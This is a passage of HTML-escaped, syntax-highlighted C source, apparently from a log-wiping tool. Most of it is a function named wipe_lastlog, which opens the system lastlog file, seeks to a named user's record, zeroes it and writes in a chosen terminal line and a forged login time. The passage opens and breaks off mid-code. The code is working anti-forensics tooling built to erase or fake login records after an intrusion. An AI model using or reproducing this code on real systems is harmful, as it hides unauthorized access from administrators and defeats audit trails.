class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003eclose\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efd1\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003eprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Done.\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#endif\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e/*\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e * LASTLOG editing.\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e */\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"kt\"\u003evoid\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nf\"\u003ewipe_lastlog\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003ewho\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003eline\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003etimestr\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003ehost\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"kt\"\u003eint\u003c/span\u003e\t\t\u003cspan class=\"n\"\u003efd1\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"k\"\u003estruct\u003c/span\u003e \u003cspan class=\"n\"\u003elastlog\u003c/span\u003e\t\u003cspan class=\"n\"\u003ell\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"k\"\u003estruct\u003c/span\u003e \u003cspan class=\"n\"\u003epasswd\u003c/span\u003e\t\u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003epwd\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"k\"\u003estruct\u003c/span\u003e \u003cspan class=\"n\"\u003etm\u003c/span\u003e\t\u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003etm\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"kt\"\u003echar\u003c/span\u003e\t\t\u003cspan class=\"n\"\u003estr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e4\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003eprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Patching %s .... \u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eLASTLOG_FILE\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003efflush\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003estdout\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"n\"\u003etm\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003estruct\u003c/span\u003e \u003cspan class=\"n\"\u003etm\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"nf\"\u003emalloc\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e \u003cspan class=\"k\"\u003esizeof\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003estruct\u003c/span\u003e \u003cspan class=\"n\"\u003etm\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"cm\"\u003e/*\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e\t * Open the lastlog file.\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e\t */\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efd1\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nf\"\u003eopen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eLASTLOG_FILE\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eO_RDWR\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e \u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"nf\"\u003efprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003estderr\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#34;ERROR: Opening %s\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eLASTLOG_FILE\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"k\"\u003ereturn\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003epwd\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nf\"\u003egetpwnam\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ewho\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"nb\"\u003eNULL\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"nf\"\u003efprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003estderr\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#34;ERROR: Can\u0026#39;t find user in passwd.\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"k\"\u003ereturn\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003elseek\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efd1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003elong\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"n\"\u003epwd\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan class=\"n\"\u003epw_uid\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e \u003cspan class=\"k\"\u003esizeof\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003estruct\u003c/span\u003e \u003cspan class=\"n\"\u003elastlog\u003c/span\u003e\u003cspan class=\"p\"\u003e),\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003ebzero\u003c/span\u003e\u003cspan class=\"p\"\u003e((\u003c/span\u003e\u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"n\"\u003ell\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"k\"\u003esizeof\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ell\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eline\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"nf\"\u003estrncpy\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ell\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ell_line\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eline\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nf\"\u003estrlen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eline\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003etimestr\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"cm\"\u003e/* YYMMddhhmm */\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nf\"\u003estrlen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003etimestr\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e!=\u003c/span\u003e \u003cspan class=\"mi\"\u003e10\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\u003cspan class=\"nf\"\u003efprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003estderr\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#34;ERROR: Time format is YYMMddhhmm.\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\u003cspan class=\"k\"\u003ereturn\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"cm\"\u003e/*\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e\t\t * Extract Times.\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e\t\t */\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"n\"\u003estr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"n\"\u003estr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003etimestr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"n\"\u003estr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003etimestr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"n\"\u003etm\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan class=\"n\"\u003etm_year\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nf\"\u003eatoi\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003estr\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"n\"\u003estr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003etimestr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"n\"\u003estr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003etimestr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e3\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"n\"\u003etm\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan class=\"n\"\u003etm_mon\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nf\"\u003eatoi\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003estr\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e \u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"n\"\u003estr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003etimestr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e4\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"n\"\u003estr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003etimestr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e5\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"n\"\u003etm\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan class=\"n\"\u003etm_mday\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nf\"\u003eatoi\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003estr\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"n\"\u003estr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003etimestr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e6\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"n\"\u003estr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003etimestr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e7\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"n\"\u003etm\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan class=\"n\"\u003etm_hour\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nf\"\u003eatoi\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003estr\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"n\"\u003estr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003etimestr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e8\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"n\"\u003estr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003etimestr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e9\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"n\"\u003etm\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan class=\"n\"\u003etm_min\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nf\"\u003eatoi\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003estr\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"n\"\u003etm\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan class=\"n\"\u003etm_sec\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan 